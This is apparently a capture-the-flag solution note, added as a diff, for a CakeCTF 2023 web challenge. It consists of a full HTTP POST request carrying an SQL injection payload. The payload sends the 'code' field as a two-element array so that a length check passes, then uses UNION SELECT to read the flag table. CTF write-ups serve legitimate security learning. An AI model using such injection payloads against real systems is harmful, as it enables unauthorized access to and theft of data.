@@ -1,0 +1,22 @@
+from discord user fr0j
+Burpsuite repeater
+This is a simple way to to keep the length of "code" to be two,
+have the statement return true, and reveal a column from another table 
+
+POST /api/search HTTP/1.1
+Host: countrydb.2023.cakectf.com:8020
+Content-Length: 90
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5790.110 Safari/537.36
+Content-Type: application/json
+Accept: */*
+Origin: http://countrydb.2023.cakectf.com:8020
+Referer: http://countrydb.2023.cakectf.com:8020/
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+Connection: close
+
+{"code":[
+         "') AND 0 UNION SELECT flag from flag --",
+         "anything"
+    ]
+}
